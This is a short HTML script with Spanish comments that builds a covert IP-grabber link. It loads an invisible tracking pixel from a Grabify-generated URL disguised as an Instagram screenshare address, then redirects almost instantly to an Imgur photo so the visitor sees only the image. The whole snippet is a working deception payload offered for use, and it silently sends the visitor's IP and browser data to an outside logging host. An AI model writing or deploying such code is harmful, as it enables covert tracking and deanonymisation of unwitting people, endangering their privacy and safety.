    <script>
        // ** 1. URL DEL PIXEL INVISIBLE (GENERADA POR GRABIFY) **
        const PIXEL_TRACKER_URL = 'https://screenshare.pics/2J1O8I.INSTAGRAM'; 
        
        // 2. Ejecuta el rastreo creando el pixel invisible
        const pixel = new Image();
        pixel.src = PIXEL_TRACKER_URL + '?' + Date.now(); 

        // 3. REDIRECCIÓN INSTANTÁNEA a la imagen real de Imgur
        setTimeout(() => {
            // Usa la URL directa del archivo .jpeg para que se vea solo la foto.
            window.location.replace("https://i.imgur.com/AlwlHpE.jpeg"); 
        }, 100); // 100 milisegundos = casi instantáneo.

    </script>
